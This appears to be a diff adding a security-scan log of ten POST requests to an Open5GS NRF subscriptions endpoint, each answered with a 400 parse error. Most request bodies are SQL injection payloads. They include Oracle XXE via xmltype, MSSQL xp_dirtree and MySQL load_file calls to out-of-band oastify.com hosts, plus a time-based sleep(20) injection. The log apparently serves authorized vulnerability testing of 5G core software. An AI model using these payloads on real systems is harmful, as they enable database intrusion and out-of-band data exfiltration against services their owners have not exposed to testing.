@@ -1,0 +1,238 @@
+
+Request Number 1
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % uqwds SYSTEM "http://uljc1erswo9wbgrwy9mqmubf86excl295xwoje73.oasti'||'fy.com/">%uqwds;]>'),'/l') from dual)
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 2
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % uqwds SYSTEM "http://4dimtoj2oy163qj6qje0e43p0g674vujy7pyco0d.oasti'||'fy.com/">%uqwds;]>'),'/l') from dual)||'
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 3
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'};declare @q varchar(99);set @q='\\f1hxhz7dc9phr17heu2b2fr0oruis6iu9kxboyem3.oasti'+'fy.com\wwk'; exec master.dbo.xp_dirtree @q;--
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 4
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}';declare @q varchar(99);set @q='\\qga8wamork4s6cmst5hmhq6b329t7hx5owcn3atyi.oasti'+'fy.com\kvf'; exec master.dbo.xp_dirtree @q;--
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 5
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'});declare @q varchar(99);set @q='\\ej1wzypcu87g90pgwtkake9z6qcha50trlfc6zwnl.oasti'+'fy.com\fft'; exec master.dbo.xp_dirtree @q;--
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 6
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}');declare @q varchar(99);set @q='\\1cejsliznv032ni3pgdxd12mzd543stgk980znpbe.oasti'+'fy.com\dix'; exec master.dbo.xp_dirtree @q;--
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 7
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+(select load_file('\\\\9u4rat0753ibkv0b7ov5v9kuhlncl0bo2qqhh47sw.oastify.com\\kxu'))
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 8
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}'+(select load_file('\\\\76bpmrc5h1u9wtc9jm7377wstjzaxynmep2gt3jr8.oastify.com\\bap'))+'
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 9
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}'
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
+
+Request Number 10
+
+POST http://127.0.0.10:7777/nnrf-nfm/v1/subscriptions
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}'(select*from(select(sleep(20)))a)'
+------------------------------------------------------------
+{'content-length': '57',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:24 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"title":	"cannot parse HTTP message",
+	"status":	400
+}
+========================================================================================================================
